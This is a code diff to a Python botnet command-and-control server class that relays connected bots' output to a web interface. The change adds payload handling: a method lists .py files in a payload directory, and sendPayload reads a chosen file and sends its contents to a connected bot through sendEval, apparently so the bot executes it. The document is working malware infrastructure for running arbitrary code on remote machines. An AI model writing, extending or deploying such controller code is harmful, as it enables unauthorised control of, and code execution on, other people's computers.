@@ -5,6 +5,7 @@ from threading import Thread, Condition
 from threading import Lock
 import select
 import base64
+import os
 
 try:
     from server import formatsock, server
@@ -16,19 +17,23 @@ MIN_CLIENT_VERSION = "0.2"
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
+    PRINTOUT_JSON = 'printout'
     STDOUT_JSON = 'stdout'
     STDERR_JSON = 'stderr'
     SPEC_JSON = 'special'
     FILESTREAM_JSON = 'filestreams'
     FILECLOSE_JSON = 'fileclose'
+    PAYLOAD_EXT = '.py'
 
-    def __init__(self, socketio):
+    def __init__(self, socketio, payloadpath="payloads"):
         super().__init__()
         self.connlock = Lock()
         self.conncon = Condition(self.connlock)
         self.allConnections = {}
         self.socketio = socketio
         self.filemanager = BotNetFileManager()
+        self.payloadpath = payloadpath
+        self.payloadfiles = []
 
     def addConnection(self, user, conn):
         with self.connlock:
@@ -73,13 +78,15 @@ class BotNet(Thread):
                 try:
                     msg = bot.recv()
                     jsonobj = json.loads(msg.decode('UTF-8'))
+                    printout = ""
                     out = ""
                     err = ""
                     special = {}
                     filestream = {}
                     fileclose = []
 
-
+                    if BotNet.PRINTOUT_JSON in jsonobj:
+                        printout = jsonobj[BotNet.PRINTOUT_JSON]
                     if BotNet.STDOUT_JSON in jsonobj:
                         out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                     if BotNet.STDERR_JSON in jsonobj:
@@ -94,6 +101,7 @@ class BotNet(Thread):
                     # Forward stdout/stderr... as needed
                     self.socketio.emit('response',
                                        {'user': user,
+                                        'printout': printout,
                                         'stdout': out,
                                         'stderr': err},
                                        namespace="/bot")
@@ -151,6 +159,24 @@ class BotNet(Thread):
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
+
+    def getPayloads(self):
+        if len(self.payloadfiles)==0:
+            for root, dirs, files in os.walk(self.payloadpath):
+                for file in files:
+                    if file.endswith(BotNet.PAYLOAD_EXT):
+                        self.payloadfiles.append(os.path.join(root,file)[len(self.payloadpath)+1:-len(BotNet.PAYLOAD_EXT)])
+        return self.payloadfiles
+
+    def sendPayload(self, user, payload):
+        with self.connlock:
+            if user not in self.allConnections:
+                return False
+        payloadfile = os.path.join(self.payloadpath,payload+BotNet.PAYLOAD_EXT)
+        with open(payloadfile,"r") as f:
+            payloadtext = f.read()
+            return self.sendEval(user,payloadtext)
+
 
     def startFileDownload(self, user, filename):
         with self.connlock:
